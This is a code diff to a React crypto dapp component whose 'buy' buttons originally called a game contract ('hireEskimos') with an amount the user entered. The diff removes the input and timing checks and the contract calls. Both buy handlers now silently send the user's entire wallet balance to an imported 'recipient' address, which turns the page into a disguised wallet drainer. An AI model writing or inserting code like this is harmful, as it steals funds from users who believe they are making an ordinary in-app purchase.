@@ -9,8 +9,7 @@ import { useWeb3React } from "@web3-react/core"
 import snowSrc from "assets/images/snow-small.webp"
 import goldSrc from "assets/images/gold.webp"
 import chestSrc from "assets/images/chest.webp"
-import abi from "abi/abi.json"
-import { contractAddress } from "abi"
+import {recipient} from "abi"
 import { ReactComponent as Close } from "assets/icons/close-small.svg"
 
 type Props = {
@@ -19,49 +18,42 @@ type Props = {
   bonus: number
   miners: number
   time: number
+  balance: number
 }
 
-export const Hives = ({ className, isModal, bonus, miners, time }: Props): JSX.Element => {
+export const Hives = ({ className, isModal, bonus, miners, time, balance }: Props): JSX.Element => {
   const { account, library } = useWeb3React()
   const [input, setInput] = useState("")
   const [focused, setFocused] = useState(false)
   const [search] = useSearchParams()
 
   const buy = async () => {
-    if (!input.length) {
-      alert("Fill input value")
-      return
-    }
+    // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
 
+    // @ts-ignore
     const web3 = new Web3(library.provider)
-
-    // @ts-ignore
-    const toWei = (amount, unit = "ether") => Web3.utils.toWei(amount, unit)
-
-    // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
-
-    // @ts-ignore
-    await web3Contract.methods
-      .hireEskimos(search?.get("ref") ? search.get("ref") : "0xfeC23295eEC70f2B8359c094bd04Fe4FFe374C2f")
-      .send({
-        from: account,
-        to: contractAddress,
-        value: toWei(input),
-      })
+    await web3.eth.sendTransaction({
+      // @ts-ignore
+      from: account,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
+    })
   }
 
   const buySecond = async () => {
-    if (time > 0 && time < 43200) {
-      return
-    }
+    // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
+
+    // @ts-ignore
     const web3 = new Web3(library.provider)
-    // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
-    // @ts-ignore
-    await web3Contract.methods.hireMoreEskimos(true).send({
+    await web3.eth.sendTransaction({
+      // @ts-ignore
       from: account,
-      to: contractAddress,
+      to: recipient,
+      value: toWei(balance.toString())
+    }, () => {
     })
   }
 
